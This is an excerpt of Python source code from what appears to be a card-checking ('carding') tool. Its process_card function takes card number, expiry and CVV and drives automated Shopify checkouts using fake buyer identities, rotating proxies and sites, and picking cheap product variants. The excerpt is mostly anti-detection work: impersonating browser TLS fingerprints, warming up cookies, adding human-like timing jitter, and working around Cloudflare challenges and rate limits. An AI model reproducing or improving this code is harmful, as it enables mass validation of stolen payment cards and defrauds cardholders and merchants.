    db_variants = get_all_variants_for_site(ourl)
    if db_variants:
        # Quick liveness check via curl_cffi — Chrome TLS fingerprint avoids
        # Cloudflare blocking the check itself. 8s timeout, just /products.json?limit=1
        try:
            _liveness_hdrs = {
                "User-Agent":      UA,
                "Accept":          "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "sec-ch-ua":       SEC_CH_UA,
                "sec-ch-ua-mobile":    "?0",
                "sec-ch-ua-platform":  '"Windows"',
            }
            live_sess = make_cffi_session(proxy_str)
            if live_sess is not None:
                try:
                    resp = await live_sess.get(
                        f"{ourl}/products.json?limit=1",
                        headers=_liveness_hdrs,
                        allow_redirects=True,
                        timeout=3,
                    )
                    status = resp.status_code
                    body   = resp.text
                    if status in (401, 402, 403, 404, 410, 423, 451):
                        print(f"[VALIDATE] {key} dead (HTTP {status}) — rotating site")
                        return False, f"Site Error! Status: {status}", "", "0.00"
                    if status == 200:
                        if '"products"' not in body and '"handle"' not in body:
                            print(f"[VALIDATE] {key} no longer Shopify — rotating site")
                            return False, "Not Shopify", "", "0.00"
                    # 429/5xx = transient — trust DB variants, proceed
                finally:
                    try: await live_sess.close()
                    except Exception: pass
            else:
                # curl_cffi not available — aiohttp fallback
                quick_timeout = aiohttp.ClientTimeout(total=8)
                async with aiohttp.ClientSession(
                    connector=make_connector(), timeout=quick_timeout
                ) as _s:
                    async with _s.get(
                        f"{ourl}/products.json?limit=1",
                        headers=_liveness_hdrs, proxy=proxy, allow_redirects=True
                    ) as resp:
                        if resp.status in (401, 402, 403, 404, 410, 423, 451):
                            return False, f"Site Error! Status: {resp.status}", "", "0.00"
                        if resp.status == 200:
                            body = await resp.text()
                            if '"products"' not in body and '"handle"' not in body:
                                return False, "Not Shopify", "", "0.00"
        except Exception as e:
            err_s = str(e).lower()
            if "proxy" in err_s or "cannot connect" in err_s:
                return False, f"Cannot connect to proxy: {e}", "", "0.00"
            if "connect" in err_s or "refused" in err_s:
                return False, "Site Error! Status: 0", "", "0.00"
            pass  # timeout / unknown — trust DB variants, proceed

        chosen = random.choice(db_variants)
        print(f"[VALIDATE] {key} OK (DB) variant={chosen['variant_id']} price={chosen['price']}")
        return True, "ok", str(chosen["variant_id"]), str(chosen["price"])

    # ── Local file cache — survives between runs, avoids re-hitting products.json ──
    cached = local_cache_get(ourl)
    if cached and cached.get("variant_id"):
        print(f"[VALIDATE] {key} OK (local cache) variant={cached['variant_id']} price={cached['price']}")
        return True, "ok", str(cached["variant_id"]), str(cached["price"])

    # ── Slow path: site NOT in DB or cache — do a full live fetch ─────────────
    print(f"[VALIDATE] {key} not in DB — live fetch")
    result = await fetch_products(ourl, proxy_str)

    if isinstance(result, dict) and result.get("variant_id"):
        vid   = str(result["variant_id"])
        price = str(result.get("price", "0.00"))
        local_cache_set(ourl, vid, price)
        print(f"[VALIDATE] {key} OK (live) variant={vid} price={price}")
        return True, "ok", vid, price

    # fetch_products returns (False, reason) on failure
    if isinstance(result, tuple):
        reason = result[1] if len(result) > 1 else "No Products"
    else:
        reason = "No Products"

    print(f"[VALIDATE] {key} DEAD — {reason}")
    return False, reason, "", "0.00"


async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, _cart_attempt=0, _tried_variants=None):
    gateway     = "UNKNOWN"
    total_price = "0.00"
    currency    = "USD"

    # Sanitize site URL — mass files often have trailing \ or spaces
    _su = (site_url or "").strip().strip('"').strip("'").rstrip("/\\")
    if _su and not _su.startswith("http"):
        _su = "https://" + _su
    ourl     = _su.rstrip("/\\")
    site_key = _normalize_site_key(ourl)
    tag      = f"[{cc[:6]}...|{mes}|{ano}|*** @ {ourl.replace('https://','')}]"
    print(f"{tag} STEP 0: Starting checkout")
    await asyncio.sleep(0.3)

    # Forced product override (operator-selected lowest SKU for this store)
    _forced_active = False
    _forced = FORCED_VARIANTS.get(site_key) or FORCED_VARIANTS.get(
        site_key.replace("www.", "") if site_key.startswith("www.") else f"www.{site_key}"
    )
    if _forced:
        variant_id, total_price = str(_forced[0]), str(_forced[1])
        _forced_active = True
        print(f"{tag} STEP 0: FORCED variant_id={variant_id} price={total_price} (site override)")

    payment_identifier = None
    proxy              = parse_proxy(proxy_str) if proxy_str else None
    checkpoint_data    = None
    running_total      = "0.00"

    try:
        # ── Pick browser profile for this checkout (anti-bot fingerprint diversity) ──
        # One profile per checkout — all requests in this session use the SAME
        # UA + sec-ch-ua + TLS fingerprint so the session looks consistent.
        _profile    = pick_browser_profile()
        _ua         = _profile["ua"]
        _sec_ch_ua  = _profile["sec_ch_ua"]
        _platform   = _profile["platform"]
        _mobile     = _profile["mobile"]
        _impersonate = _profile.get("impersonate", "chrome136")
        print(f"{tag} STEP 0: browser profile={_impersonate} ua={_ua[40:70]}...")

        # Base headers — dynamic profile UA, exact from HAR
        headers = {
            "User-Agent":          _ua,
            "Accept":              "application/json, text/plain, */*",
            "Accept-Encoding":     "gzip, deflate, br, zstd",
            "Accept-Language":     "en-US,en;q=0.9",
            "Content-Type":        "application/json",
            "Origin":              ourl,
            "Referer":             ourl,
            "sec-ch-ua":           _sec_ch_ua,
            "sec-ch-ua-mobile":    _mobile,
            "sec-ch-ua-platform":  _platform,
        }

        addr         = pick_addr("USD")  # initial default — re-picked after currency is known
        country_code = addr["countryCode"]
        firstName, lastName = Utils.get_random_name()
        email    = Utils.generate_email(firstName, lastName)
        phone    = addr["phone"]
        street   = addr["address1"]
        city     = addr["city"]
        state    = addr["zoneCode"]
        s_zip    = addr["postalCode"]
        address2 = ""

        # ── STEP 0: Site pre-validation + variant resolution ─────────────────
        #
        # NEW FLOW:
        # 1. Check if site is in 429 cooldown — if yes, immediately rotate
        # 2. Call validate_site() — confirms site is alive + gets a real variant
        # 3. If site is dead/unsupported → return dead-site code to Go (Go rotates)
        # 4. Only proceed to cart if site passed validation
        #
        # This eliminates the flood of Cart 429s caused by hammering a site
        # that is already rate-limiting us, and ensures we never attempt a
        # checkout on a dead/login-gated/non-Shopify store.

        # ── 429 cooldown check ───────────────────────────────────────────────
        if _is_site_cooling(site_key):
            print(f"{tag} STEP 0: site in 429 cooldown — rotating")
            return False, "Cart failed with status 429", gateway, total_price, currency

        if proxy_str and _is_proxy_cooling(proxy_str):
            print(f"{tag} STEP 0: proxy in 429 cooldown — rotating proxy")
            return False, "Cart failed with status 429", gateway, total_price, currency

        # ── Per-site-per-proxy gap check ─────────────────────────────────────
        # Prevent the same proxy from hitting the same site too quickly.
        # This is the primary cause of persistent 429s — not TLS fingerprint.
        _allowed, _wait = _can_attempt(site_key, proxy_str)
        if not _allowed:
            print(f"{tag} STEP 0: site+proxy gap not met ({_wait:.1f}s remaining) — rotating")
            return False, "Cart failed with status 429", gateway, total_price, currency

        # ── Site validation (only on first attempt, not on variant retries) ──
        if _cart_attempt == 0 and variant_id is None:
            site_ok, site_reason, live_vid, live_price = await validate_site(ourl, proxy_str)
            if not site_ok:
                # Dead site / unsupported / dead proxy — return immediately
                print(f"{tag} STEP 0: site FAILED validation — {site_reason}")
                return False, site_reason, gateway, total_price, currency
            # Use the validated variant if caller didn't supply one
            variant_id  = live_vid
            total_price = live_price
            print(f"{tag} STEP 0: site validated — variant={variant_id} price={total_price}")

        # ── Load full variant pool for cart-fail rotation ────────────────────
        _site_variants = get_all_variants_for_site(ourl)  # shuffled list of dicts

        if not variant_id:
            if _site_variants:
                _chosen     = _site_variants[_cart_attempt % len(_site_variants)]
                variant_id  = str(_chosen["variant_id"])
                total_price = str(_chosen.get("price", "0.00"))
                print(f"{tag} STEP 0: DB HIT variant_id={variant_id} "
                      f"price={total_price} ({len(_site_variants)} variants in pool)")
            else:
                print(f"{tag} STEP 0: site not in variants.db — skipping")
                return False, "No Products", gateway, total_price, currency

        # ── Hard price cap guard — never proceed with an out-of-window variant ──
        # Covers caller-supplied variant_id, stale local cache, and any path
        # that bypassed the selection filters. Re-selects from the DB pool or
        # rotates the site if nothing in-window is available.
        try:
            _p = float(str(total_price).replace(",", ""))
        except (ValueError, TypeError):
            _p = 0.0
        if (not _forced_active) and (_p < MIN_VARIANT_PRICE or _p > MAX_VARIANT_PRICE):
            print(f"{tag} STEP 0: variant price {total_price} outside "
                  f"${MIN_VARIANT_PRICE:.2f}-${MAX_VARIANT_PRICE:.2f} — re-selecting")
            _replacement = None
            for _v in _site_variants:
                try:
                    _vp = float(str(_v["price"]).replace(",", ""))
                except (ValueError, TypeError):
                    continue
                if MIN_VARIANT_PRICE <= _vp <= MAX_VARIANT_PRICE:
                    _replacement = _v
                    break
            if _replacement is None:
                print(f"{tag} STEP 0: no in-window variant available — rotating site")
                return False, "No Products", gateway, total_price, currency
            variant_id  = str(_replacement["variant_id"])
            total_price = str(_replacement["price"])
            print(f"{tag} STEP 0: re-selected variant={variant_id} price={total_price}")

        connector = make_connector()
        timeout   = aiohttp.ClientTimeout(total=60)  # proposals=19s + PCI + submit + poll

        # ── Open ONE curl_cffi session for site-facing requests ──────────────
        # Cart add (STEP 1) and checkout page (STEP 2) go through curl_cffi so
        # Shopify/Cloudflare sees a real Chrome TLS fingerprint matching our UA.
        # Profile picked above is passed in so TLS impersonation matches the UA.
        curl_sess = make_cffi_session(proxy_str, profile=_profile)

        # ── STEP 0.5: Cookie warm-up — simulate a real browser first visit ──
        # A real Chrome user hits the store homepage before adding to cart.
        # This causes Shopify to set session cookies (_shopify_s, _shopify_y,
        # _tracking_consent, cart) in the browser.  Our cold session has zero
        # cookies — Shopify detects this and raises the bot score.
        #
        # Fix: GET the product page (not homepage — direct product URL matches
        # the HAR Referer on the cart add exactly) to seed the cookie jar.
        # curl_cffi's AsyncSession persists cookies across requests automatically.
        # We use the same session that will do the cart add, so cookies flow through.
        #
        # We do this ONLY when curl_cffi is available — aiohttp fallback doesn't
        # need it since we're already using the same aiohttp session for GraphQL.
        if curl_sess is not None:
            _warmup_url = f"{ourl}/products/?variant={variant_id}"
            _warmup_hdrs = {
                "User-Agent":                _ua,
                "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Encoding":           "gzip, deflate, br, zstd",
                "Accept-Language":           "en-US,en;q=0.9",
                "Cache-Control":             "max-age=0",
                "sec-ch-ua":                 _sec_ch_ua,
                "sec-ch-ua-mobile":          _mobile,
                "sec-ch-ua-platform":        _platform,
                "sec-fetch-dest":            "document",
                "sec-fetch-mode":            "navigate",
                "sec-fetch-site":            "none",
                "sec-fetch-user":            "?1",
                "upgrade-insecure-requests": "1",
            }
            try:
                _w = await curl_sess.get(
                    _warmup_url,
                    headers=_warmup_hdrs,
                    allow_redirects=True,
                    timeout=3,
                )
                _cookies_set = list(curl_sess.cookies.keys()) if hasattr(curl_sess, 'cookies') else []
                print(f"{tag} STEP 0.5: cookie warm-up done "
                      f"status={_w.status_code} cookies={_cookies_set}")

                # CF challenge / rate-limit on warm-up → empty cookies → cart will 429.
                # Rotate to a fresh modern fingerprint and retry warm-up (up to 2x).
                _wu_try = 0
                while (
                    (_w.status_code in (429, 403) or not _cookies_set)
                    and _wu_try < 2
                ):
                    _wu_try += 1
                    print(f"{tag} STEP 0.5: warm-up blocked ({_w.status_code}) — "
                          f"rotating fingerprint (retry {_wu_try}/2)")
                    await asyncio.sleep(3.0 + _wu_try * 2.0)
                    try:
                        await curl_sess.close()
                    except Exception:
                        pass
                    _profile = pick_browser_profile()
                    _ua = _profile["ua"]
                    _sec_ch_ua = _profile["sec_ch_ua"]
                    _platform = _profile["platform"]
                    _mobile = _profile["mobile"]
                    _impersonate = _profile.get("impersonate", "chrome136")
                    headers["User-Agent"] = _ua
                    headers["sec-ch-ua"] = _sec_ch_ua
                    headers["sec-ch-ua-mobile"] = _mobile
                    headers["sec-ch-ua-platform"] = _platform
                    print(f"{tag} STEP 0.5: new profile={_impersonate}")
                    curl_sess = make_cffi_session(proxy_str, profile=_profile)
                    _warmup_hdrs = {
                        **_warmup_hdrs,
                        "User-Agent": _ua,
                        "sec-ch-ua": _sec_ch_ua,
                        "sec-ch-ua-mobile": _mobile,
                        "sec-ch-ua-platform": _platform,
                    }
                    _w = await curl_sess.get(
                        _warmup_url,
                        headers=_warmup_hdrs,
                        allow_redirects=True,
                        timeout=3,
                    )
                    _cookies_set = list(curl_sess.cookies.keys()) if hasattr(curl_sess, 'cookies') else []
                    print(f"{tag} STEP 0.5: cookie warm-up done "
                          f"status={_w.status_code} cookies={_cookies_set}")

                await _human_jitter(200, 600)
            except Exception as _we:
                # Warm-up failure is non-fatal — continue without cookies
                print(f"{tag} STEP 0.5: warm-up failed ({type(_we).__name__}: {_we}) — continuing cold")

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            url      = ourl
            cart_url = url + "/cart/add.js"
            checkout = url + "/checkout/"

            # ── STEP 1: Add to cart via curl_cffi (Chrome TLS fingerprint) ──
            print(f"{tag} STEP 1: Adding to cart...")
            # Record this attempt so same proxy doesn't hit same site too fast
            _record_attempt(site_key, proxy_str)
            # Human-like jitter before cart — breaks bot-pattern timing detection
            await _human_jitter(100, 400)
            try:
                vid_int = int(variant_id)
            except Exception:
                vid_int = variant_id

            product_referer = f"{url}/products/?variant={variant_id}"

            cart_status = 0
            cart_resp_text = ""

            # ── Forced SKU: use Shopify cart permalink (replaces cart) ───────
            # /cart/VARIANT:1 sets the cart to EXACTLY that line (qty 1).
            # /cart/add.js only appends and can leave residual items → inflated totals.
            _forced_hit = FORCED_VARIANTS.get(site_key) or FORCED_VARIANTS.get(
                site_key[4:] if site_key.startswith("www.") else f"www.{site_key}"
            )
            if _forced_hit and curl_sess is not None:
                _plink = f"{url}/cart/{variant_id}:1"
                print(f"{tag} STEP 1: forced cart permalink {_plink}")
                try:
                    _pr = await curl_sess.get(
                        _plink,
                        headers={
                            **headers,
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                            "Referer": product_referer,
                            "sec-fetch-dest": "document",
                            "sec-fetch-mode": "navigate",
                            "sec-fetch-site": "same-origin",
                            "sec-fetch-user": "?1",
                            "upgrade-insecure-requests": "1",
                        },
                        allow_redirects=True,
                        timeout=3,
                    )
                    print(f"{tag} STEP 1: permalink status={_pr.status_code}")
                    # Verify cart contents
                    _cj = await curl_sess.get(
                        f"{url}/cart.js",
                        headers={
                            **headers,
                            "Accept": "application/json",
                            "Referer": _plink,
                            "X-Requested-With": "XMLHttpRequest",
                        },
                        allow_redirects=True,
                        timeout=15,
                    )
                    try:
                        _cart = _cj.json() if hasattr(_cj, "json") and callable(_cj.json) else json.loads(_cj.text)
                    except Exception:
                        _cart = {}
                        try:
                            _cart = json.loads(getattr(_cj, "text", "") or "")
                        except Exception:
                            _cart = {}
                    _items = _cart.get("items") or []
                    _item_ok = False
                    for it in _items:
                        if str(it.get("variant_id") or it.get("id")) == str(variant_id):
                            _item_ok = True
                            _qty = it.get("quantity", 1)
                            _line = it.get("final_line_price") or it.get("line_price") or it.get("price") or 0
                            print(f"{tag} STEP 1: cart.js lines={len(_items)} "
                                  f"forced_qty={_qty} line_cents={_line} "
                                  f"cart_total_cents={_cart.get('total_price')}")
                            break
                    if _item_ok and len(_items) == 1 and _pr.status_code in (200, 302, 303):
                        # Verify cart total is near forced price (cents)
                        try:
                            _expect = float(_forced_hit[1]) * 100.0
                            _got = float(_cart.get("total_price") or 0)
                        except Exception:
                            _expect, _got = 0.0, 0.0
                        if _expect and _got and _got > _expect * 1.35:
                            print(
                                f"{tag} STEP 1: cart total {_got/100:.2f} >> forced "
                                f"{_expect/100:.2f} — clear + permalink retry"
                            )
                            try:
                                await curl_sess.post(
                                    f"{url}/cart/clear.js",
                                    headers={**headers, "Accept": "application/json",
                                             "X-Requested-With": "XMLHttpRequest"},
                                    allow_redirects=True, timeout=3,
                                )
                            except Exception:
                                pass
                            await curl_sess.get(
                                _plink,
                                headers={**headers, "Accept": "text/html", "Referer": product_referer},
                                allow_redirects=True, timeout=3,
                            )
                            _cj2 = await curl_sess.get(
                                f"{url}/cart.js",
                                headers={**headers, "Accept": "application/json"},
                                allow_redirects=True, timeout=15,
                            )
                            try:
                                _cart = json.loads(_cj2.text)
                            except Exception:
                                pass
                            print(
                                f"{tag} STEP 1: after retry cart_total_cents="
                                f"{_cart.get('total_price')} items={len(_cart.get('items') or [])}"
                            )
                        cart_status = 200
                        cart_resp_text = json.dumps(_cart)[:500]
                        print(f"{tag} STEP 1: ✅ forced cart set via permalink")
                    elif _item_ok and len(_items) > 1:
                        # Extra lines — clear then permalink again
                        print(f"{tag} STEP 1: residual lines={len(_items)} — clear + permalink")
                        try:
                            await curl_sess.post(
                                f"{url}/cart/clear.js",
                                headers={**headers, "Accept": "application/json",
                                         "X-Requested-With": "XMLHttpRequest",
                                         "Referer": url + "/"},
                                allow_redirects=True,
                                timeout=3,
                            )
                        except Exception:
                            pass
                        await curl_sess.get(
                            _plink,
                            headers={**headers, "Accept": "text/html", "Referer": product_referer},
                            allow_redirects=True,
                            timeout=3,
                        )
                        cart_status = 200
                    else:
                        print(f"{tag} STEP 1: permalink did not stick — fall through to cart/add.js")
                except Exception as _pe:
                    print(f"{tag} STEP 1: permalink failed ({type(_pe).__name__}: {_pe}) — fall through")

            # Shared cart headers — HAR-exact
            # Key insight from HAR: Referer must be the actual product page URL
            # (the page the user was on before clicking Add to Cart).
            # Also: accept-language must be present, priority u=1,i is mandatory.
            _cart_hdrs_base = {
                **headers,
                "Accept":             "text/html",
                "Accept-Language":    "en-US,en;q=0.9",
                "x-requested-with":   "XMLHttpRequest",
                "priority":           "u=1, i",
                "sec-fetch-dest":     "empty",
                "sec-fetch-mode":     "cors",
                "sec-fetch-site":     "same-origin",
                "Referer":            product_referer,
            }

            async def _cart_post_cffi(data_, content_type=None, attempt_label=""):
                """POST to cart_url via curl_cffi, returns status_code."""
                nonlocal cart_status, cart_resp_text
                extra = {"Content-Type": content_type} if content_type else {}
                final_hdrs = {**_cart_hdrs_base, **extra}
                try:
                    if curl_sess is not None:
                        # ── CART DEBUG: log full request before sending ───────
                        # CART-DEBUG suppressed for speed
                        # CART-DEBUG suppressed for speed
                        # CART-DEBUG suppressed for speed
                        # CART-DEBUG suppressed for speed
                        r = await curl_sess.post(
                            cart_url,
                            data=data_,
                            headers=final_hdrs,
                            allow_redirects=True,
                            timeout=3,
                        )
                        cart_status    = r.status_code
                        cart_resp_text = r.text
                        # ── CART DEBUG: log full response ─────────────────────
                        if cart_status not in (200, 201): print(f"{tag} [CART] status={cart_status}")
                        if cart_status not in (200, 201): print(f"{tag} [CART] body: {cart_resp_text[:200]}")
                        if cart_status == 429:
                            print(f"{tag} [CART] RATE LIMITED 429")
                    else:
                        # fallback to aiohttp if curl_cffi unavailable
                        r2 = await session.post(
                            cart_url, data=data_,
                            headers=final_hdrs,
                            proxy=proxy)
                        cart_status    = r2.status
                        cart_resp_text = await r2.text()
                        if cart_status not in (200, 201): print(f"{tag} [CART] aiohttp status={cart_status}")
                except Exception as _e:
                    cart_status = 0
                    # SUPPRESSED: print(f"{tag} [CART-DEBUG{attempt_label}] EXCEPTION: {type(_e).__name__}: {_e}")

            # ── Attempt A: multipart/form-data — HAR-exact format ────────────
            # HAR shows: form_type, utf8, id, quantity, product-id, section-id, sections
            # The extra fields (product-id, section-id, sections) are what a real
            # browser's product form submits — without them the request looks like a bot.
            if cart_status not in (200, 201):
                await _cart_post_cffi(
                    f"form_type=product&utf8=%E2%9C%93&id={variant_id}&quantity=1",
                    content_type="application/x-www-form-urlencoded; charset=UTF-8",
                    attempt_label="-A",
                )

            # ── 429: long cooldown then ONE retry only (no A→B→C→D spam) ────
            # Rapid retries after CF 429 make the ban longer. Old mass runs
            # survived because they waited between cards instead of hammering.
            if cart_status == 429:
                _wait = 10.0 + random.random() * 5.0
                print(f"{tag} [CART] 429 — cooling down {_wait:.0f}s before single retry")
                await asyncio.sleep(_wait)
                await _cart_post_cffi(
                    f"form_type=product&utf8=%E2%9C%93&id={variant_id}&quantity=1",
                    content_type="application/x-www-form-urlencoded; charset=UTF-8",
                    attempt_label="-A-retry",
                )

            # ── Attempt B: JSON body (only if not rate-limited) ──────────────
            if cart_status not in (200, 201) and cart_status != 429:
                await _cart_post_cffi(
                    json.dumps({"items": [{"id": vid_int, "quantity": 1}]}),
                    content_type="application/json",
                    attempt_label="-B",
                )

            # ── Attempt C: /cart/add alternate path (skip if rate-limited) ──
            if cart_status not in (200, 201) and cart_status != 429:
                try:
                    if curl_sess is not None:
                        r = await curl_sess.post(
                            url + "/cart/add",
                            data=f"id={variant_id}&quantity=1",
                            headers={
                                **headers,
                                "Content-Type": "application/x-www-form-urlencoded",
                                "Accept":       "text/html,*/*",
                                "Referer":      product_referer,
                            },
                            allow_redirects=True,
                            timeout=3,
                        )
                        cart_status = r.status_code
                    else:
                        r2 = await session.post(
                            url + "/cart/add",
                            data=f"id={variant_id}&quantity=1",
                            headers={
                                **headers,
                                "Content-Type": "application/x-www-form-urlencoded",
                                "Accept":       "text/html,*/*",
                                "Referer":      product_referer,
                            },
                            proxy=proxy, allow_redirects=True)
                        cart_status = r2.status
                except Exception:
                    pass



            print(f"{tag} STEP 1: Cart status={cart_status}")

            # ── Log every non-200 cart result to cart_fails.txt ─────────────
            # Saves: timestamp | site URL | variant_id | status | response body
            if cart_status not in (200, 201):
                try:
                    import os as _os, datetime as _dt
                    _os.makedirs("logs", exist_ok=True)
                    with open("logs/cart_fails.txt", "a", encoding="utf-8") as _cf:
                        _cf.write(
                            f"[{_dt.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "
                            f"STATUS={cart_status} "
                            f"SITE={ourl} "
                            f"VARIANT={variant_id} "
                            f"BODY={cart_resp_text[:300]}\n"
                        )
                except Exception:
                    pass

            if cart_status == 429:
                _set_site_cooldown(site_key, proxy_str)
                print(f"{tag} STEP 1: Cart 429 persistent — site cooled, rotating")
                if curl_sess:
                    try: await curl_sess.close()
                    except Exception: pass
                return False, f"Cart failed with status {cart_status}", gateway, total_price, currency

            if cart_status in (422, 404):
                # 422 = sold out / variant unavailable
                # 404 = variant deleted from the store entirely
                # Rotate through the pre-loaded variant pool (no network calls).
                # After exhausting MAX_CART_ATTEMPTS → tell Go to rotate to new site.
                MAX_CART_ATTEMPTS = 3
                reason = "sold out" if cart_status == 422 else "variant deleted"
                print(f"{tag} STEP 1: Cart {cart_status} ({reason}) "
                      f"attempt {_cart_attempt+1}/{MAX_CART_ATTEMPTS}")

                if _cart_attempt >= MAX_CART_ATTEMPTS - 1:
                    print(f"{tag} STEP 1: {MAX_CART_ATTEMPTS} variants tried — rotating site")
                    return False, f"Cart failed with status {cart_status}", gateway, total_price, currency

                # Pick next variant from the pre-loaded pool (skip ALL previously tried ones)
                if _tried_variants is None:
                    _tried_variants = set()
                _tried_variants.add(str(variant_id))

                next_vid = None
                if _site_variants:
                    for v in _site_variants:
                        if str(v["variant_id"]) not in _tried_variants:
                            next_vid = str(v["variant_id"])
                            break

                if not next_vid:
                    # Pool exhausted — try live fetch as last resort
                    next_vid = await _fetch_fresh_variant(ourl, proxy_str, exclude_id=str(variant_id))

                if next_vid:
                    print(f"{tag} STEP 1: rotating to variant {next_vid} "
                          f"(attempt {_cart_attempt+2}/{MAX_CART_ATTEMPTS}, "
                          f"tried={len(_tried_variants)})")
                    return await process_card(cc, mes, ano, cvv, site_url,
                                              variant_id=next_vid, proxy_str=proxy_str,
                                              _cart_attempt=_cart_attempt + 1,
                                              _tried_variants=_tried_variants)

                # No new variant found — reuse current one (Go will supply fresh proxy)
                print(f"{tag} STEP 1: pool exhausted — reusing {variant_id} with fresh proxy")
                return await process_card(cc, mes, ano, cvv, site_url,
                                          variant_id=str(variant_id), proxy_str=proxy_str,
                                          _cart_attempt=_cart_attempt + 1,
                                          _tried_variants=_tried_variants)

            if cart_status not in (200, 201):
                if curl_sess:
                    try: await curl_sess.close()
                    except Exception: pass
                return False, f"Cart failed with status {cart_status}", gateway, total_price, currency

            # ── Cart success — save to good_sites.json ───────────────────────
            # Cart returned 200/201 → this site+variant is confirmed working.
            # Saved to logs/good_sites.json for analysis and future use.
            try:
                save_good_site(ourl, str(variant_id), str(total_price))
                print(f"{tag} STEP 1: ✅ cart OK — saved to good_sites.json")
            except Exception:
                pass

            # ── STEP 2: Get checkout page via curl_cffi ──────────────────────
            # curl_cffi handles br/zstd decoding natively via libcurl, so no
            # need to strip Accept-Encoding anymore — Chrome-exact headers work.
            nav_hdrs = {
                **headers,
                "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Content-Type":    "application/x-www-form-urlencoded",
                "sec-fetch-dest":  "document",
                "sec-fetch-mode":  "navigate",
                "sec-fetch-site":  "same-origin",
                "sec-fetch-user":  "?1",
                "upgrade-insecure-requests": "1",
            }
            print(f"{tag} STEP 2: Getting checkout page...")
            # Small human-like delay between cart success and checkout navigation
            await _human_jitter(150, 500)

            checkout_url = ""
            text         = ""
            response_headers = {}

            async def _checkout_post(url_, data_="checkout=", hdrs_=None):
                """POST via curl_cffi, returns (final_url, text, resp_headers)."""
                _h = hdrs_ or nav_hdrs
                if curl_sess is not None:
                    try:
                        r = await curl_sess.post(
                            url_, data=data_, headers=_h,
                            allow_redirects=True, timeout=15)
                        return str(r.url), r.text, dict(r.headers)
                    except Exception as _e:
                        print(f"{tag} curl_cffi checkout POST error: {_e}")
                # aiohttp fallback
                r2 = await session.post(
                    url_, data=data_, headers={**_h, "Accept-Encoding": "gzip, deflate"},
                    allow_redirects=True, proxy=proxy)
                return str(r2.url), await r2.text(), dict(r2.headers)

            async def _checkout_get(url_, hdrs_=None):
                """GET via curl_cffi, returns (final_url, text, resp_headers)."""
                _h = hdrs_ or nav_hdrs
                if curl_sess is not None:
                    try:
                        r = await curl_sess.get(
                            url_, headers=_h,
                            allow_redirects=True, timeout=15)
                        return str(r.url), r.text, dict(r.headers)
                    except Exception as _e:
                        print(f"{tag} curl_cffi checkout GET error: {_e}")
                r2 = await session.get(
                    url_, headers={**_h, "Accept-Encoding": "gzip, deflate"},
                    allow_redirects=True, proxy=proxy)
                return str(r2.url), await r2.text(), dict(r2.headers)

            try:
                checkout_url, text, response_headers = await _checkout_post(url + "/cart")
            except Exception as e:
                if curl_sess:
                    try: await curl_sess.close()
                    except Exception: pass
                return False, f"Checkout page error: {e}", gateway, total_price, currency

            if "/checkouts/cn/" not in checkout_url:
                try:
                    checkout_url, text, response_headers = await _checkout_post(checkout)
                except Exception:
                    pass
            if "/checkouts/" not in checkout_url and "/checkout" not in checkout_url:
                try:
                    checkout_url, text, response_headers = await _checkout_get(checkout)
                except Exception:
                    pass

            m             = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
            attempt_token = m.group(1) if m else checkout_url.split("/")[-1].split("?")[0]

            # Session token — try response header first, then page HTML
            sst = (response_headers.get("X-Checkout-One-Session-Token") or
                   response_headers.get("x-checkout-one-session-token"))
            if not sst:
                for pat, ep in [
                    ('name="serialized-sessionToken" content="&quot;', "&quot;"),
                    ('name="serialized-sessionToken" content="', '"'),
                    ('"serializedSessionToken":"', '"'),
                    ('data-session-token="', '"'),
                    ('"sessionToken":"', '"'),
                ]:
                    sst = extract_between(text, pat, ep)
                    if sst:
                        sst = sst.replace("&quot;", "").strip('"')
                        break

            print(f"{tag} STEP 2: checkout_url={checkout_url[:60]} sst={bool(sst)}")
            if "login" in checkout_url.lower():
                if curl_sess:
                    try: await curl_sess.close()
                    except Exception: pass
                return False, "Site requires login!", gateway, total_price, currency
            if not sst and any(x in text.lower() for x in
                               ["verifying your connection", "cf-browser-verification",
                                "just a moment", "_cf_chl", "challenge-platform"]):
                if curl_sess:
                    try: await curl_sess.close()
                    except Exception: pass
                return False, "Change Proxy", gateway, total_price, currency

            # ── SST retry via GET if still missing ───────────────────────────
            if not sst and "/checkouts/" in checkout_url:
                try:
                    print(f"{tag} STEP 2: sst missing — retrying via GET {checkout_url[:60]}")
                    _, text2, hdrs2 = await _checkout_get(checkout_url)
                    sst = (hdrs2.get("X-Checkout-One-Session-Token") or
                           hdrs2.get("x-checkout-one-session-token"))
                    if not sst:
                        for pat, ep in [
                            ('name="serialized-sessionToken" content="&quot;', "&quot;"),
                            ('name="serialized-sessionToken" content="', '"'),
                            ('"serializedSessionToken":"', '"'),
                            ('data-session-token="', '"'),
                            ('"sessionToken":"', '"'),
                        ]:
                            sst = extract_between(text2, pat, ep)
                            if sst:
                                sst  = sst.replace("&quot;", "").strip('"')
                                text = text2
                                break
                    if sst:
                        print(f"{tag} STEP 2: sst recovered via GET retry")
                except Exception as e:
                    print(f"{tag} STEP 2: GET retry failed: {e}")

            if not sst:
                if curl_sess:
                    try: await curl_sess.close()
                    except Exception: pass
                return False, "Failed to get session token", gateway, total_price, currency

            # ── Close curl_cffi session — no longer needed past STEP 2 ───────
            # All remaining calls (GraphQL proposal/submit/poll, PCI vault) use
            # the aiohttp session which is fine for authenticated API calls.
            if curl_sess:
                try:
                    await curl_sess.close()
                except Exception:
                    pass
                curl_sess = None

            unesc      = text.replace("&quot;", '"').replace("&amp;", "&").replace("&#39;", "'")
            queueToken = (extract_between(text, "queueToken&quot;:&quot;", "&quot;") or
                          extract_between(text, '"queueToken":"', '"'))
            stableId   = (extract_between(text, "stableId&quot;:&quot;", "&quot;") or
                          extract_between(text, '"stableId":"', '"'))
            merch      = (extract_between(text, "ProductVariantMerchandise/", "&quot;") or
                          extract_between(text, "ProductVariantMerchandise/", "&q") or
                          extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or
                          str(variant_id))

            currency = "USD"
